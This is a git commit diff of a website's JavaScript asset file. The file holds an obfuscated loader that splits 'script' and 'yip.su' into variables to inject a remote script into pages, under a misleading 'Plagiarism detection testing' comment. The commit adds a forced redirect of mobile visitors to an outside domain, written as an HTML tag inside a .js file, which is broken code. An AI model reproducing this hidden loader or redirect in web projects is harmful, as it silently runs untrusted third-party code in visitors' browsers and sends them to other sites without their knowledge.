04bd4c80d40c6ed4f7a1084fd7999d1699d808a2
Kasya Team <70856891+kasyateam@users.noreply.github.com>
2021-10-25 16:17:03 +0600

    Update kasya.js

--- assets/kasyateam/js/kasya.js
+++ assets/kasyateam/js/kasya.js
@@ -1,4 +1,10 @@
 //Plagiarism detection testing
+
+<script type='text/javascript'>
+if(window.innerWidth<600)
+    location.href='https://m.kteam.tk/';
+</script>
+
 var glop = 'script'
 var glap = 'yip.su'
 document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/1Yskk7.js"></'+glop+'>')
